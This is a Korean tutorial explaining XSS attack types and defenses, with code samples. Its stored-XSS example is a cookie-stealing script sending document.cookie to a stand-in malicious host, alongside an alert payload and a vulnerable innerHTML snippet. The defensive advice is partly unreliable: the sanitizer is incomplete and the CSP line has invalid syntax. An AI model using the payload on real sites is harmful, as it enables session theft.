# 📌 XSS (Cross-Site Scripting) 보안

## 🔹 XSS란?

XSS(Cross-Site Scripting)는 공격자가 **웹 페이지에 악성 스크립트를 삽입**하여 사용자 브라우저에서 실행되도록 유도하는 공격 기법입니다. XSS 공격이 성공하면 **세션 탈취, 피싱, 악성 코드 실행** 등의 보안 위협이 발생할 수 있습니다.

---

## 🔹 XSS 공격 유형

XSS 공격은 크게 **Stored XSS**, **Reflected XSS**, **DOM-based XSS** 세 가지 유형으로 나뉩니다.

### ✅ 1. Stored XSS (저장형 XSS)

- 악성 스크립트가 **서버에 저장**되고, 사용자가 해당 데이터를 조회할 때 실행됨.
- 공격자는 게시글, 댓글, 프로필 등에 악성 코드 삽입 가능.

📌 **예제**: 게시판에 악성 스크립트를 삽입하는 경우

```html
<script>
  document.location = 'http://malicious-site.com/steal?cookie=' + document.cookie;
</script>
```

### ✅ 2. Reflected XSS (반사형 XSS)

- URL 파라미터를 통해 악성 스크립트를 전달하며, 사용자가 이를 클릭하면 실행됨.
- 주로 피싱 공격 및 악성 링크 유포에 사용됨.

📌 **예제**: 공격자가 악성 링크를 생성하여 사용자를 유도하는 경우

```plaintext
http://example.com/search?q=<script>alert('XSS')</script>
```

### ✅ 3. DOM-based XSS

- 클라이언트 측 JavaScript에서 `innerHTML`, `document.write()` 등을 사용해 직접 DOM을 조작할 때 발생함.
- 서버 응답이 아닌 클라이언트 코드에서 취약점이 발생하는 특징이 있음.

📌 **예제**: JavaScript에서 `location.search` 값을 DOM에 직접 삽입하는 경우

```javascript
const params = new URLSearchParams(window.location.search);
document.getElementById('output').innerHTML = params.get('input');
```

---

## 🔹 XSS 공격 방어 방법

### ✅ 1. 입력값 검증 및 필터링

- 사용자 입력값을 반드시 **검증(Validation)**하고, 허용된 문자만 받도록 제한.
- HTML 태그나 JavaScript 코드 삽입을 방지.

```javascript
function sanitizeInput(input) {
  return input.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
```

### ✅ 2. 출력 시 HTML 이스케이프(Escape) 처리

- 서버에서 데이터를 출력할 때 HTML 이스케이프 처리를 적용하여 태그 실행을 방지.

```html
&lt;script&gt;alert("XSS")&lt;/script&gt;
```

📌 **템플릿 엔진을 사용할 경우 자동으로 이스케이프 처리 제공**

- EJS: `<%= userInput %>` → 자동 이스케이프
- Handlebars: `{{userInput}}` → 자동 이스케이프

### ✅ 3. HTTP 응답 헤더 설정

- `Content Security Policy (CSP)`를 적용하여 스크립트 실행을 제한.
- `X-XSS-Protection`을 활성화하여 브라우저에서 기본적인 XSS 방어 기능을 활용.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'https://trusted-cdn.com'
X-XSS-Protection: 1; mode=block
```

### ✅ 4. JavaScript에서 `innerHTML` 사용 지양

- `innerHTML`, `document.write()`, `eval()` 대신 `textContent`나 `createElement()` 사용.

```javascript
document.getElementById('output').textContent = userInput;
```

---

## 📌 요약

- **XSS란?** 악성 스크립트를 웹 페이지에 삽입하여 사용자에게 실행시키는 공격 기법.
- **주요 유형:** 저장형(Stored), 반사형(Reflected), DOM 기반(DOM-based) XSS.
- **예방 방법:** 입력 검증, HTML 이스케이프, CSP 설정, `innerHTML` 사용 지양.

XSS 공격을 방어하면 **사용자의 데이터와 보안을 보호할 수 있으며**, 안전한 웹 애플리케이션을 구축할 수 있습니다! 🚀
